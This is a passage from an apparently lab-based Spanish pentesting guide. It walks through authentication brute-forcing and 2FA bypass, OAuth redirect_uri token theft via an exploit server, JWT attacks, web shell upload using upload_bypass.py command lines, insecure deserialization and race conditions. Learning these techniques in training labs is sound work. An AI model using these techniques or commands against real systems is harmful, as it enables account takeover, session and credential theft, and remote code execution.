Cuando obtengamos el `nombre de usuario`, repetiremos el proceso, pero marcando como segunda `posición` el `valor del campo password` en lugar del `username`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-5/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-5/)

7 - En caso de que no descubramos ninguna `cabecera` que nos permita `bypassear` el `bloqueo`, contaremos cuántos `intentos` son necesarios para que este se produzca. Después, comprobaremos si el `número de intentos` se `reinicia` al usar unas `credenciales válidas`

Si es así, crearemos un `diccionario de nombres de usuario` en el que intercalemos un `usuario válido` seguido del `usuario a bruteforcear`, repitiendo este patrón hasta cubrir todos los `usuarios` y, con el `diccionario de contraseñas`, procederemos de la misma forma. Como en los puntos anteriores, aplicaremos un `Grep - Extract` sobre el `mensaje de error` para observar las `variaciones`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-6/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-6/)

8 - Si lo anterior no funciona, probaremos a `enumerar usuarios` bloqueando sus `cuentas`. Por ejemplo, si al `iniciar sesión` con nuestro `usuario` y una `credencial incorrecta` la `cuenta` se `bloquea` tras cierto número de `intentos`, contaremos cuántos hacen falta y crearemos un `diccionario` que repita esa cantidad de veces cada uno de los `nombres de usuario a bruteforcear`. Como en los puntos anteriores, aplicaremos un `Grep - Extract` sobre el `mensaje de error` para observar las `variaciones`

En este caso no debemos preocuparnos si al `bruteforcear la contraseña` obtenemos un `error`, ya que puede ocurrir que, aunque una `contraseña incorrecta` nos devuelva un `timeout`, la `correcta` genere una `respuesta diferente` que nos permita identificarla. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-7/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-7/)

9 - El último método para `bruteforcear` el `login` consiste en aprovechar la `funcionalidad de cambio de contraseña`. Tras `iniciar sesión` con nuestras `credenciales`, capturamos la `petición de cambio de contraseña` y comprobamos si en ella podemos `especificar` un `usuario` distinto al nuestro, como `carlos`

Enviándola al `Repeater` observamos que, si el `Current password` es `incorrecto` y los campos `New password` y `Confirm new password` no coinciden, el `servidor` responde `Current password is incorrect`, mientras que si el `Current password` es `correcto` responde `New passwords do not match`

Aprovechando esa `diferencia`, enviamos la `petición` al `Intruder`, colocamos el `diccionario de contraseñas` en el campo `Current password` (dejando `New password` y `Confirm new password` distintos entre sí) y filtramos por `Length`. La `respuesta` con `New passwords do not match` nos revelará la `contraseña correcta` del `usuario víctima`, con la que podremos `iniciar sesión`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-12/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-12/)

10 - Si tras `loguearnos` la `aplicación` nos solicita un `2FA`, podemos intentar `bypassearlo` dropeando la `segunda petición` correspondiente al `2FA` o, simplemente, accediendo a la `raíz del sitio web (/)` una vez `logueados`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-2/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-2/)

11 - Si al `iniciar sesión` se nos solicita un `código 2FA` de `menos de 6 dígitos`, podemos `bruteforcearlo`. Para ello, nos `logueamos` con nuestras `credenciales` e inspeccionamos las `peticiones` para ver si podemos `especificar` un `nombre de usuario` o `correo electrónico` distinto al nuestro, de forma que se genere el `2FA` de ese otro `usuario`. Hecho esto, `bruteforceamos` el `código` y accedemos a la `cuenta` del `usuario víctima`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-8/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-8/)

12 - Si podemos `cambiar la contraseña` de nuestro `usuario`, realizaremos todo el `proceso` y comprobaremos si en la `petición de cambio de contraseña` es posible `especificar` un `usuario` distinto al nuestro para `cambiarle la contraseña`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-3/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-3/)

13 - Para explotar un `password reset poisoning via middleware`, `iniciamos sesión` con nuestras `credenciales` y solicitamos un `restablecimiento de contraseña` mediante `Forgot password?`. Al revisar el `email client` del `exploit server` comprobaremos que el enlace incluye un `token temporal`

Con las extensiones `Param Miner (Guess headers)` y `Logger++` descubrimos que la `aplicación` construye la `URL` del `restablecimiento` a partir de la `cabecera X-Forwarded-Host`, que identificaremos filtrando en `Grep values` el `token` recibido en el correo

A continuación, capturamos la `petición` de `Forgot password?` y añadimos esa `cabecera` apuntando a nuestro `exploit server`, de modo que el enlace del correo se dirija a él, y lo confirmaremos observando el `token temporal` en el `log` de nuestro `servidor` al pulsar el enlace

Por último, repetimos el proceso solicitando el `restablecimiento` para la víctima `carlos` (no necesitamos su `correo`, ya que la `web` también admite `nombres de usuario`) y, cuando esta pulse el enlace, recibiremos su `token temporal`, que usaremos en la `URL` real de `restablecimiento` para asignarle una `nueva contraseña` e `iniciar sesión` en su `cuenta`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-11/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-11/)

14 - Si al `iniciar sesión` disponemos de una opción del tipo `stay logged in`, la marcamos. Una vez dentro, pegamos la `cookie` en `Hash Identifier` para averiguar qué `codificación` emplea y la `decodificamos`. Si en su interior hay más contenido `codificado o cifrado`, repetimos el proceso

Si observamos que la `cookie` se construye a partir de valores como el `nombre de usuario` y la `contraseña` (por ejemplo, `Base64(usuario:MD5(contraseña))`), podremos `bruteforcear` al `usuario`. Para ello generaremos, mediante un `script`, un `diccionario` de `cookies` candidatas en el que, por cada `contraseña`, calculemos su `MD5`, formemos la cadena `usuario:MD5` y la codifiquemos en `Base64`, teniendo en cuenta que se trata de dos `transformaciones` distintas, ya que `MD5` es `hashing` y `Base64` es `encoding`

Finalmente, cargamos ese `diccionario` en el `Intruder` y lo enviamos sobre el valor de la `cookie` para `bruteforcearla` y acceder a la `cuenta` del `usuario víctima`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-9/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-9/)

15 - Si además de la opción `stay logged in` podemos publicar `comentarios`, probaremos a `explotar` un `Stored XSS`. La idea es inyectar un `payload` que consiga que el `usuario víctima` envíe su `cookie de sesión` a nuestro `exploit server`

Aunque podríamos `acceder` a su `cuenta` directamente con ella, cabe la posibilidad de que, como en el punto anterior, podamos `extraer` el `usuario` y la `contraseña`. Para ello inspeccionaremos la `cookie` con `Hash Identifier`, la `decodificaremos o descifraremos` y repetiremos el proceso si contiene más capas

En cuanto a la `contraseña`, antes de `bruteforcearla` probaremos con `rainbow tables` como `CrackStation` o, simplemente, buscando su `hash` en `Google`. Si tenemos `dudas` con esto, podemos `leernos` este `post` [https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-10/](https://justice-reaper.github.io/posts/Authentication-Vulnerabilities-Lab-10/)

## Vulnerabilidades de OAuth

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades de OAuth?

1 - `Instalar` la extensión `OAUTH Scan` de `Burpsuite`

2 - `Interactuar con todas las funcionalidades de OAuth del sitio web`

3 - Agregar el `dominio` y `subdominios` de `OAuth` y del `dominio normal` 

4 - `Analizar las peticiones que se han producido`

5 - Ahora lo que vamos a hacer es `cerrar sesión` e `iniciar sesión usando OAuth` y `volver a analizar las peticiones que se han producido ahora`. `Una vez hecho estos 2 análisis, ya podemos usar estas peticiones para probar los ataques que se plantean a continuación`

6 - Si al `iniciar sesión` vemos que se `envía` un `email`, cambiaremos ese `email` por el de `otro usuario` para ver si podemos `iniciar sesión` en su `cuenta`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-1/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-1/)

7 - `Mientras` nos `logueamos` nos `dirigimos` al `logger` y vemos a ver si se está cargando algún `logo` en el `dominio de autenticación de OAuth`. Si es así nos `enviamos` esa `petición` al `Repeater` y `comprobamos` si `existe` este archivo `/.well-known/oauth-authorization-server` u este otro `/.well-known/openid-configuration` en el `dominio de autenticación de OAuth`. Si existen, intentaremos `crear una aplicación cliente con el parámetro logo_uri apuntando a una página interna de la máquina víctima, para conseguir así las credenciales de otro usuario`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-2/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-2/)

8 - Si tenemos la opción de `linkear` nuestra `cuenta normal` con nuestra `cuenta de redes sociales`, `iniciaremos sesión` con la `cuenta normal` y la `linkearemos` con nuestra `cuenta de redes sociales`. Después intentaremos `linkear nuestra cuenta normal con la de redes sociales nuevamente pero esta vez, capturaremos el flujo de peticiones y cuando lleguemos petición en la que se envía el código de verificación https://0abf000b04d62b1d81eb2062009100d1.web-security-academy.net/oauth-linking?code=bHAvk0wtclb6jTsPVrCczl_QARMaJ6tev-NO9sqGu_s la dropearemos`. Nos `iremos` al `Exploit Server` y `crearemos` un `payload` con este `enlace` para que `cuando el usuario víctima acceda, vincule su cuenta a nuestra cuenta de redes sociales`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-3/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-3/)

9 - Nos `logueamos` normalmente, nos `deslogueamos` y volvemos a `loguearnos`. En este último `inicio de sesión` veremos que se `tramita` una `petición` de este estilo `https://oauth-0a2b006b0469ac418024c403028300be.oauth-server.net/auth?client_id=a6i3uxn36dmkju1zrg48d&redirect_uri=https://0a87005e046eac448059c68000c6005b.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email`. `Enviamos` esta `petición` al `Repeater` y si vemos que podemos `manipular` el `parámetro redirect_uri`, vamos a `crear un payload para que el parámetro redirect_uri apunte a nuestro Exploit Server y así robarle a la víctima su código de autorización de OAuth e iniciar sesión en su cuenta`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-4/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-4/)

10 - En caso de que `lo anterior no sea posible porque el parámetro redirect_uri no nos acepta cualquier URL`, vamos a intentar hacer un `path traversal simple ../` y esto lo vamos a combinar con un `open redirect`, tal que así `https://0adc001204d776348092711d002b00da.web-security-academy.net/post/next?path=https://google.es`. El resultado final sería este `https://oauth-0ae9004f04e1c6638185ddac0230000f.oauth-server.net/auth?client_id=q2q7kc9umvpf7hxambobn&redirect_uri=https://0a8400660405c6888116dfdf00be0038.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a35002e0433c6b6813cde6b01a300cb.exploit-server.net/exploit&response_type=token&nonce=-1397029964&scope=openid%20profile%20email`, lo que hacemos es aprovechar el `path traversal` para `acceder` a la `página` en la que se encuentra el `open redirect` y usar el `open redirect` para `hacer una petición` a nuestro `Exploit Server` para `robarle` al `usuario víctima` su `token de autenticación` y así `poder ver información de su cuenta haciendo una petición a una ruta del dominio de autenticación de OAuth`. Esta ruta podría ser `/me` u otra en la que se muestre `información del usuario`. `Si tenemos dudas con este procedimiento es recomendable leerse este post` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-5/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Lab-5/)

## JWT attacks

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades de JWT?

1 - `Instalar` las extensiones `JWT Scanner`, `JWT Editor` y `JWT4B` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4 - Debemos tener la `sesión iniciada` con `algún usuario` para `capturar` su `JWT`

5 - `Capturamos` con `Burpsuite` una `petición` a algún `endpoint` que `requiera autenticación con un JWT válido` y que `devuelva` un `código de estado 200 OK`. Un `ejemplo` de esto, sería `/myaccount`. Sabremos que `petición` es la que `contiene` un `JWT` porque se nos `marcará` en `verde` en el `Intercept` o en `amarillo` en el `Logger`

6 - Una vez `capturamos` la `petición` la `enviamos` al `Repeater` y `tenemos que pulsar sobre Send antes de ejecutar JWT Scanner` o de lo contrario `no podrá identificar la vulnerabilidad a la que nos enfretamos`

7 - Una vez tenemos la `petición` en el `Repeater` y nos `devuelve` un `200 OK`, hacemos `click derecho > Extensions > JWT Scanner > Scan selected/Scan (autodetect)`. Para que funcione `Scan selected` debemos `seleccionar` con el `ratón` el `JWT`

8 - Dependiendo de la `vulnerabilidad` que `identifique` deberemos `seguir los pasos de un laboratorio u otro para lograr llevar a cabo el ataque correspondiente de forma exitosa`

9 - Si nos identifica `Invalid JWT Signature` o `JWT Signature not required` iremos al `primer laboratorio` [https://justice-reaper.github.io/posts/JWT-Attacks-Lab-1/](https://justice-reaper.github.io/posts/JWT-Attacks-Lab-1/)

10 - Si nos identifica `JWT algorithm none attack` iremos al `segundo laboratorio` [https://justice-reaper.github.io/posts/JWT-Attacks-Lab-2/](https://justice-reaper.github.io/posts/JWT-Attacks-Lab-2/)

11 - Si nos identifica `JWT is signed symmetrically` o `JWT weak HMAC secret` iremos al `tercer laboratorio` [https://justice-reaper.github.io/posts/JWT-Attacks-Lab-3/](https://justice-reaper.github.io/posts/JWT-Attacks-Lab-3/)

12 - Si nos identifica `JWT jwk header injection` iremos al `cuarto laboratorio` [https://justice-reaper.github.io/posts/JWT-Attacks-Lab-4/](https://justice-reaper.github.io/posts/JWT-Attacks-Lab-4/)

13 - Si nos identifica `JWT jku pingback` iremos al `quinto laboratorio` [https://justice-reaper.github.io/posts/JWT-Attacks-Lab-5/](https://justice-reaper.github.io/posts/JWT-Attacks-Lab-5/)

14 - Si nos identifica `JWT kid header path traversal` iremos al `sexto laboratorio` [https://justice-reaper.github.io/posts/JWT-Attacks-Lab-6/](https://justice-reaper.github.io/posts/JWT-Attacks-Lab-6/)

## Vulnerabilidades de subida de archivos

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar vulnerabilidades de subida de archivos?

1 - `Añadir` el `dominio` y sus `subdominios` al `scope`

2 - `Iniciamos sesión`, `interactuar manualmente` con `todas las funcionalidades de la web` y la `crawleamos` con `Burpsuite`

3 - `Si encontramos un campo de subida de archivos`, `subimos un archivo normal`, `capturamos la petición con Burpsuite`, hacemos `Ctrl + A` para `seleccionar todo el texto` y pulsamos en `Save selected text` para `guardarla en un archivo`

4 - Una vez la `imagen se ha subido correctamente`, hacemos `click derecho sobre ella` y `copiamos la dirección de la imagen`. `Esta ruta la usaremos posteriormente para indicar dónde se almacenan los archivos que subimos mediante el parámetro -D`. Además, debemos `quedarnos con una parte del mensaje de subida correcta que no sea variable`, para que `la herramienta sepa cuándo un archivo se ha subido con éxito`. `Esto último lo indicaremos mediante el parámetro -s`

5 - `Lanzamos` la herramienta `Upload Bypass` primero `únicamente con el módulo de path traversal`. Esto lo `hacemos` para `ahorrar tiempo`, porque `path_traversal es uno de los últimos módulos y así no tenemos que esperar tanto`. Debemos tener en cuenta que `el módulo de path traversal solo retrocede un nivel (../)`, por lo que `si necesitamos retroceder más de una vez, tendremos que hacerlo manualmente siguiendo la guía de path traversal` [https://justice-reaper.github.io/posts/Path-Traversal-Guide/](https://justice-reaper.github.io/posts/Path-Traversal-Guide). `En los laboratorios no nos ha hecho falta pero no está de más tener esto en cuenta`

```
python upload_bypass.py -r /home/justice-reaper/Downloads/request.txt -s "has been uploaded" -E php -D /files/avatars -e -c -i path_traversal -o /home/justice-reaper/Downloads/results.txt
```

6 - `Después lanzamos la herrameinta de forma normal`

```
python upload_bypass.py -r /home/justice-reaper/Downloads/request.txt -s "has been uploaded" -E php -D /files/avatars -e -c -o /home/justice-reaper/Downloads/results.txt
```

7 - `Si queremos ver la petición válida, es decir, la que nos ha proporcionado una shell, debemos mirar la petición en el archivo results.txt`

8 - `Si tenemos dudas` con los `pasos anteriores` podemos `consultar estos posts`:

Remote code execution via web shell upload: [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-1/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-1/)

Web shell upload via Content-Type restriction bypass: [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-2/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-2/)

Web shell upload via path traversal: [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-3/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-3/)

Web shell upload via extension blacklist bypass: [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-4/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-4/)

Web shell upload via obfuscated file extension: [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-5/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-5/)

Remote code execution via polyglot web shell upload: [https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-6/](https://justice-reaper.github.io/posts/File-Upload-Vulnerabilities-Lab-6/)

## Insecure deserialization

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un insecure deserealization?

1 - `Seguir los pasos de la guía de information disclosure` [https://justice-reaper.github.io/posts/Information-Disclosure-Guide/](https://justice-reaper.github.io/posts/Information-Disclosure-Guide/) para `recopilar` la `máxima información posible` y luego intentar `explotar` el `insecure deserialization` con la `información obtenida`. Puede ser que en esta `parte` nos `encontremos` un `archivo de backup` (por ejemplo un `.php~`) que `filtre` el `código fuente` de la `aplicación`. Este `backup` nos `muestra` las `clases`, `métodos` y `propiedades` que podemos `llamar`, de manera que sabremos `qué objeto` tenemos que `construir` y `qué funciones` se `ejecutarán` al `deserializarlo`. También puede que nos `encontremos` un `phpinfo.php` que nos `filtre información` muy `útil`, como la `versión de PHP`, las `funciones deshabilitadas` o incluso una `secret key` que luego podamos usar para `firmar` la `cookie` con `nuestro objeto malicioso`

2 - Debemos `inspeccionar` la `cookie` de `nuestro usuario` desde `Burpsuite`. Para `identificar` la `tecnología` que se está usando podemos `borrar parte de la cookie para provocar un error`. Este `error` nos puede `revelar` el `lenguaje` que se está usando e incluso el `framework` y su `versión` (por ejemplo `Symfony 4.3.6`), lo cual nos `interesa` para poder `elegir` la `gadget chain` correcta más adelante. En el que caso en que se use `Java` para la `serialización` del `objeto` podemos usar `ysoserial` y si se usa `PHP` usaremos `phpggc`. Si el `lenguaje` es `distinto` a `PHP` o `Java` tendremos que `buscar herramientas alternativas` o `exploits documentados`. A la hora de `generar` el `payload` con `ysoserial` debemos usar una `versión` de `Java 8` u `11` para que `funcione correctamente`. Lo que tenemos que hacer es `reemplazar` o `modificar` el `objeto serializado existente` por `el nuestro`, de forma que cuando el `servidor` lo `deserialice` se `ejecute` la `acción` que `nosotros queremos`

3 - Cuando `desconozcamos` el `access_token` u otro `parámetro` de `otro usuario` podemos intentar `sustituirlo` por un `booleano b:1` o por un `integer i:0` y de esta forma `bypassear la validación`

4 - Puede darse el caso de que `encontremos` una `funcionalidad` de la `aplicación` que `nos permita borrar nuestra cuenta de usuario`. Si se `transmite` un `objeto` con `nuestra información` y ahí se encuentra nuestra `foto de perfil` por ejemplo, podríamos `modificar esa ruta dentro del objeto` para que `se borre el archivo que nosotros queremos`

5 - Si tenemos `dudas` con los `pasos anteriores` podemos `consultar` estos `posts`:

- Modifying serialized objects: [https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-1/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-1/)

- Modifying serialized data types: [https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-2/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-2/)

- Using application functionality to exploit insecure deserialization: [https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-3/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-3/)

- Arbitrary object injection in PHP: [https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-4/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-4/)

- Exploiting Java deserialization with Apache Commons: [https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-5/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-5/)

- Exploiting PHP deserialization with a pre-built gadget chain: [https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-6/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-6/)

- Exploiting Ruby deserialization using a documented gadget chain: [https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-7/](https://justice-reaper.github.io/posts/Insecure-Deserialization-Lab-7/)

## Race conditions

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar una race condition?

1 - `Instalar` la extensión `Turbo Intruder`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Nos logueamos`, `crawleamos` el `dominio` con `Burpsuite` e `interactuamos manualmente con todas las funcionalidades del sitio web`

4 - `Identificar` un `endpoint crítico` para la `seguridad` que pueda `presentar` un `riesgo potencial de colisión`

5 - Desde el `Repeater`, `creamos` un `grupo` con las `peticiones` que vamos a `usar` para `causar` la `race condition`. Normalmente, las `race conditions` son más `fáciles` de `explotar` si `enviamos entre 20 y 30 peticiones a la vez`, sin embargo, `hay ocasiones en las que es mejor utilizar solamente 2 peticiones`. La `única diferencia` es que es `probable` que `tengamos realizar más intentos hasta que obtengamos un colisión si solo utilizamos 2 peticiones`

6 - `Dependiendo de la funcionalidad`, tendremos que `usar` la opción `Send group in sequence (single connection)` o `Send group in sequence (separate connections)` 

7 - `Una vez enviadas las peticiones usando alguno de los dos formas`, tenemos que `fijarnos` en el `delay` de las `peticiones`, si vemos que la `diferencia` es `muy grande` vamos a tener que usar la `técnica` de `connection warming` o la de `abusing rate or resource limits` para hacer que `el delay entre peticiones sea de unos 10 milisegundos o de máximo 50 milisegundos`. A `menor delay`, `mayor es la probabilidad de que se produzca una race window y por lo tanto, también hay mayor probabilidad de que podamos explotar la race condition con éxito`. Podemos ver un `ejemplo` de `connection warming` en este `laboratorio` [https://justice-reaper.github.io/posts/Race-Conditions-Lab-3/](https://justice-reaper.github.io/posts/Race-Conditions-Lab-3/)

8 - `Una vez hayamos logrado que el delay entre peticiones se encuentre entre 0 milisegundos y 50 milisegundos`, tenemos que `enviar` las `peticiones` usando `Send group (parallel)`

9 - `Hay ocasiones en las que se implementan mecanismos de bloqueo basados en la sesión`. Esto puede `provocar` que `para la misma sesión sola podamos mandar una petición a la vez para ejecutar una acción`. Sin embargo, es posible `bypassear` esta `restricción` si `enviamos` una `petición` desde `dos sesiones diferentes`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable leer este `post` [https://justice-reaper.github.io/posts/Race-Conditions-Lab-5/](https://justice-reaper.github.io/posts/Race-Conditions-Lab-5/)

10 - A la `hora` de `comprar` un `producto` podemos `añadir` un `producto muy barato` a la `cesta`. Si hay una `race condition`, podría ser posible `añadir un producto a la cesta cuyo costo supere el monto de dinero que tenemos antes de que se realice el checkout`. De esta forma, `obtendríamos 2 productos por el precio de 1`, ya que `el segundo producto no se nos cobraría`. Esto es posible porque la `acción crítica` se `reparte entre varios endpoints diferentes`, de modo que podemos `explotar` la `race condition` enviando `peticiones a esos distintos endpoints a la vez` para `aprovechar la race window que se produce entre ellos`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable visitar este `laboratorio` [https://justice-reaper.github.io/posts/Race-Conditions-Lab-3/](https://justice-reaper.github.io/posts/Race-Conditions-Lab-3/)

11 - Si `tenemos` un `código de descuento`, `podemos intentar aplicarlo varias veces` mediante una `race condition`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable visitar este `laboratorio` [https://justice-reaper.github.io/posts/Race-Conditions-Lab-1/](https://justice-reaper.github.io/posts/Race-Conditions-Lab-1/)

12 - Si nos `encontramos` con un `panel de login` y `no podemos iniciar sesión con las credenciales por defecto`, podemos `intentar realizar un ataque de fuerza bruta` para `acceder a la cuenta del usuario carlos o administrator`. Si `cada cierto número de fallos obtenemos un timeout`, podemos `saltarnos` este `rate limit` mediante una `race condition` utilizando la `extensión Turbo Intruder de Burpsuite`. Si tenemos `dudas` sobre cómo hacer esto, es recomendable visitar este `laboratorio` [https://justice-reaper.github.io/posts/Race-Conditions-Lab-2/](https://justice-reaper.github.io/posts/Race-Conditions-Lab-2/)

13 - Si tenemos la `opción` de `proporcionar un email` a la `hora` de `cambiar la contraseña`, `pedir un desbloqueo de cuenta`, `cambiar nuestro email` o `cualquier otra información de valor`, podemos hacer que `nos llegue a nuestro email la información de otro usuario a través de una race condition`. Si tenemos `dudas` sobre cómo `cambiar la contraseña` es recomendable leer este `post` [https://justice-reaper.github.io/posts/Race-Conditions-Lab-5/](https://justice-reaper.github.io/posts/Race-Conditions-Lab-5/) y si tenemos `dudas` sobre cómo `cambiar el email` este otro [https://justice-reaper.github.io/posts/Race-Conditions-Lab-4/](https://justice-reaper.github.io/posts/Race-Conditions-Lab-4/)

## Web cache poisoning

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un web cache poisoning?

Teniendo en cuenta que `los términos y herramientas mencionados a continuación` se `encuentran` en la `cheatsheet mencionada anteriormente`, llevaremos a cabo los siguientes pasos:

1 - `Instalar` las extensiones `Diff Hunter` y `Param Miner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacerle `crawling` al `dominio` con `Burpsuite` y `explorar todas las funcionalidades de la web manualmente`

4 - `Lanzamos la herramienta Web Cache Vulnerability Scanner sobre los endpoints que consideremos interesantes`. `No tenemos que esperar a que la herramienta termine`, tenemos que `ver la información mostrada y probar las cosas que descubre manualmente`

5 - `Si no descubrimos nada con la herramienta anterior`, `ponemos` la `extensión Diff Hunter` en `ON`, `marcamos como targets los endpoints interesantes` y `dejamos marcada solo la opción Request And Response Differences Only` 

6 - `Seleccionamos los endpoints interesantes` y `lanzamos Param Miner sobre ellos`. Tenemos que `lanzar las opciones Guess everything!, fat GET, normalised path y normalised param`

7 - El `siguiente paso` es `comparar las diferencias de las peticiones en Diff Hunter`, si hay `coincidencias` que se `repiten` en las `respuestas` y que `no tienen importancia`, podemos `crear una regex para ignorarlas`

8 - `Gracias a este último paso`, podemos `identificar las discrepancias` y `elaborar un ataque`

9 - Si tenemos dudas con los pasos anteriores podemos consultar estos posts:

Web cache poisoning with an unkeyed header: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-1/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-1/)

Web cache poisoning with an unkeyed cookie: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-2/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-2/)

Web cache poisoning with multiple headers: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-3/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-3/)

Targeted web cache poisoning using an unknown header: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-4/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-4/)

Web cache poisoning via an unkeyed query string: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-5/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-5/)

Web cache poisoning via an unkeyed query parameter: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-6/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-6/)

Parameter cloaking: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-7/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-7/)

Web cache poisoning via a fat GET request: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-8/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-8/)

URL normalization: [https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-9/](https://justice-reaper.github.io/posts/Web-Cache-Poisoning-Lab-9/)

## Web cache deception

### Cheatsheet

